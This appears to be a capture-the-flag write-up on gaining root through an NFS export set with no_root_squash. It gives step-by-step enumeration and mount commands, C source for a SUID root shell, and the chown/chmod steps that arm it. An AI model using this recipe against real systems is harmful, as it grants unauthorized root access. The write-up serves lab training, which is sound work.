# NFS Privilege Escalation

## Step 1: User & Permission Enumeration

First, identify the current user and check available permissions.

```bash
whoami
id
sudo -l
```

## Step 2: NFS Configuration Enumeration

Since sudo access is unavailable, inspect the NFS exports configuration.

```bash
cat /etc/exports
```

**Finding:**

```text
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

**Hint:** `no_root_squash` is important because it allows root on an NFS client to retain root privileges when accessing the exported share.

## Step 3: Enumerate & Mount NFS Share

Check available NFS shares:

```bash
showmount -e TARGET_IP
```

Create a mount directory on the attacker machine:

```bash
mkdir /tmp/backupsonattackermachine
```

Mount the target share:

```bash
sudo mount -t nfs TARGET_IP:/home/backup /tmp/backupsonattackermachine
```

Check mounted files:

```bash
ls -la /tmp/backupsonattackermachine
```

## Step 4: Create a SUID Shell Binary

Create a C source file:

```bash
nano /tmp/shell.c
```

Source code:

```c
#include <stdlib.h>
#include <unistd.h>

int main() {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

Compile the binary:

```bash
gcc /tmp/shell.c -o /tmp/backupsonattackermachine/shell
```

## Step 5: Set SUID Permissions

On the attacker machine, set ownership and permissions:

```bash
sudo chown root:root /tmp/backupsonattackermachine/shell
sudo chmod 4755 /tmp/backupsonattackermachine/shell
```

**Hint:** The root-owned SUID binary can potentially execute with elevated privileges when launched on the target.

## Step 6: Execute on Target Machine

Return to the target machine and execute:

```bash
/home/backup/shell
```

Check privileges:

```bash
id
```

If the binary is not compatible with the target architecture or libraries, compile a compatible static binary and repeat the transfer and permission steps.

Example:

```bash
gcc -static /tmp/shell.c -o /tmp/shell-static
```

Locate the flag:

```bash
find / -name "flag*.txt" 2>/dev/null
```

Read the flag:

```bash
cat /path/to/flag.txt
```

## Technique

- **Category:** Linux Privilege Escalation
- **Method:** NFS Misconfiguration
- **Vulnerability:** `no_root_squash`
- **Technique Used:** SUID Binary
- **Result:** Root Access
